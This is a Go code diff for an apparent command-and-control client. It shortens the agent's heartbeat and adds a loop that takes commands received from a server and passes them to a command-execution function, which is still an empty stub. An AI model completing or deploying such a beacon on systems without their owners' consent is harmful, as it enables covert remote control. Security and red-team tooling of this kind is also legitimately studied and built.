@@ -5,6 +5,7 @@ import (
 	"encoding/gob"
 	"encoding/hex"
 	"global"
+	"helpers"
 	"log"
 	"net"
 	"os"
@@ -13,7 +14,7 @@ import (
 
 var (
 	message   = global.Message{}
-	heartBeat = 30
+	heartBeat = 10
 )
 
 const (
@@ -35,13 +36,42 @@ func main() {
 
 		defer channel.Close()
 
+		//Sending message to server
 		gob.NewEncoder(channel).Encode(message)
 
+		//Receiving message from server
 		gob.NewDecoder(channel).Decode(message)
+
+		if messageContainsCommand(message) {
+			for i, v := range message.Commands {
+				message.Commands[i].Response = execCommand(v.Request)
+			}
+		}
 
 		time.Sleep(time.Duration(heartBeat) * time.Second)
 	}
+}
 
+func execCommand(command string) (response string) {
+
+	separateCommand := helpers.CommandsSplit(command)
+	baseCommando := separateCommand[0]
+
+	switch baseCommando {
+	case "htb":
+	default:
+		//
+	}
+
+	return response
+}
+
+func messageContainsCommand(serverMessage global.Message) (contains bool) {
+	contains = false
+	if len(serverMessage.Commands) > 0 {
+		contains = true
+	}
+	return contains
 }
 
 func generateID() string {
